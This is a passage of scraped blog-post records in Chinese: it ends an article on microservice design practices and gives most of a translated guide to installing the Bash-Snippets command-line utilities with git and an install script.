alt=\"\"></p>\n<p>这意味着开发人员不会创建Web微服务，逻辑微服务或数据库微服务。相反，他们为搜索，推荐，客户服务等创建单独的微服务。</p>\n<p>这种类型的应用程序架构不仅可以帮助开发人员克服以前架构所面临的所有挑战，还可以帮助轻松构建，部署和扩展购物车应用程序。</p>\n<p>通过上述案列，我们可以总结出来，设计微服务的最佳实践：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/7fd01c434dddc51bf7ea1e1d12ccbf7c.jpg\" alt=\"\"></p>\n<p>1，为每个微服务分别存储数据</p>\n<p>2，将代码保持在类似的成熟度级别</p>\n<p>3，为每个微服务单独构建</p>\n<p>4，部署到容器</p>\n<p>5，将服务设计为无状态服务</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114308\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114308votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114308\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/2c71fc7a77086bca21c9b4854d1a7119552d3db0.jpg"}
{"title": "献给命令行重度用户的一组实用 BASH 脚本", "url": "http://blog.jobbole.com/114303/", "create_date": "2018/08/22", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/08/1e19e82a0dc17db6a2d4b661b2864324.png"], "url_object_id": "486a505af4ab582a54fc4564f8e4675d", "praise_nums": 2, "fav_nums": 1, "comment_nums": 1, "tags": "IT技术,Bash,Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.ostechnix.com/collection-useful-bash-scripts-heavy-commandline-users/\">SK</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9939-1.html\">Linux中国/MjSeven</a>   </div><p>今天，我偶然发现了一组适用于命令行重度用户的实用 BASH 脚本，这些脚本被称为 <strong>Bash-Snippets</strong>，它们对于那些整天都与终端打交道的人来说可能会很有帮助。想要查看你居住地的天气情况？它为你做了。想知道股票价格？你可以运行显示股票当前详细信息的脚本。觉得无聊？你可以看一些 YouTube 视频。这些全部在命令行中完成，你无需安装任何严重消耗内存的 GUI 应用程序。</p>\n<p>在撰写本文时，Bash-Snippets 提供以下 19 个实用工具：</p>\n<ol>\n<li><strong>Cheat</strong> – Linux 命令备忘单。</li>\n<li><strong>Cloudup</strong> – 一个将 GitHub 仓库备份到 bitbucket 的工具。</li>\n<li><strong>Crypt</strong> – 加解密文件。</li>\n<li><strong>Cryptocurrency</strong> – 前 10 大加密货币的实时汇率转换。</li>\n<li><strong>Currency</strong> – 货币转换器。</li>\n<li><strong>Geo</strong> – 提供 wan、lan、router、dns、mac 和 ip 的详细信息。</li>\n<li><strong>Lyrics</strong> – 从命令行快速获取给定歌曲的歌词。</li>\n<li><strong>Meme</strong> – 创造命令行表情包。</li>\n<li><strong>Movies</strong> – 搜索并显示电影详情。</li>\n<li><strong>Newton</strong> – 执行数值计算一直到符号数学解析。（to 校正：这里不理解）</li>\n<li><strong>Qrify</strong> – 将给定的字符串转换为二维码。</li>\n<li><strong>Short</strong> – 缩短 URL</li>\n<li><strong>Siteciphers</strong> – 检查给定 https 站点启用或禁用的密码。</li>\n<li><strong>Stocks</strong> – 提供某些股票的详细信息。</li>\n<li><strong>Taste</strong> – 推荐引擎提供三个类似的项目，如提供物品（如书籍、音乐、艺术家、电影和游戏等。）</li>\n<li><strong>Todo</strong> – 命令行待办事项管理。</li>\n<li><strong>Transfer</strong> – 从命令行快速传输文件。</li>\n<li><strong>Weather</strong> – 显示你所在地的天气详情。</li>\n<li><strong>Youtube-Viewer</strong> – 从终端观看 YouTube 视频。</li>\n</ol>\n<p>作者可能会在将来添加更多实用程序和/或功能，因此我建议你密切关注该项目的网站或 GitHub 页面以供将来更新。</p>\n<h3 id=\"toc_1\">安装</h3>\n<p>你可以在任何支持 BASH 的操作系统上安装这些脚本。</p>\n<p>首先，克隆 git 仓库，使用以下命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83d62944566691\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ git clone https://github.com/alexanderepstein/Bash-Snippets</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83d62944566691-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83d62944566691-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">git </span><span class=\"crayon-r\">clone</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">https</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//github.com/alexanderepstein/Bash-Snippets</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>进入目录：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83d6b250567224\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ cd Bash-Snippets/</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83d6b250567224-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83d6b250567224-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">cd </span><span class=\"crayon-v\">Bash</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">Snippets</span><span class=\"crayon-o\">/</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>切换到最新的稳定版本：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83d6f890572853\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ git checkout v1.22.0</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83d6f890572853-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83d6f890572853-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">git </span><span class=\"crayon-e\">checkout </span><span class=\"crayon-v\">v1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-cn\">22.0</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>最后，使用以下命令安装 Bash-Snippets：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83d72400233386\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ sudo ./install.sh</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83d72400233386-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83d72400233386-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">sudo</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">install</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sh</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>这将询问你要安装哪些脚本。只需输入 <code>Y</code> 并按回车键即可安装相应的脚本。如果你不想安装某些特定脚本，输入 <code>N</code> 并按回车键。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83d76076380710\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nDo you wish to install currency [Y/n]: y</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83d76076380710-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83d76076380710-1\"><span class=\"crayon-st\">Do</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">you </span><span class=\"crayon-e\">wish </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">install </span><span class=\"crayon-i\">currency</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">Y</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">y</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>要安装所有脚本，运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83d79720981515\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ sudo ./install.sh all</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83d79720981515-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83d79720981515-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">sudo</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">install</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">sh </span><span class=\"crayon-v\">all</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>要安装特定的脚本，比如 currency，运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83d7c071805638\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ sudo ./install.sh currency</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83d7c071805638-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83d7c071805638-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">sudo</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">install</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">sh </span><span class=\"crayon-v\">currency</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>你也可以使用 <a href=\"https://www.ostechnix.com/linuxbrew-common-package-manager-linux-mac-os-x/\">Linuxbrew</a> 包管理器来安装它。</p>\n<p>安装所有的工具，运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83d7f263050232\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ brew install bash-snippets</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83d7f263050232-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83d7f263050232-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">brew </span><span class=\"crayon-e\">install </span><span class=\"crayon-v\">bash</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">snippets</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>安装特定的工具：</p><!-- Crayon Syntax Highlighter v2.7.1.1 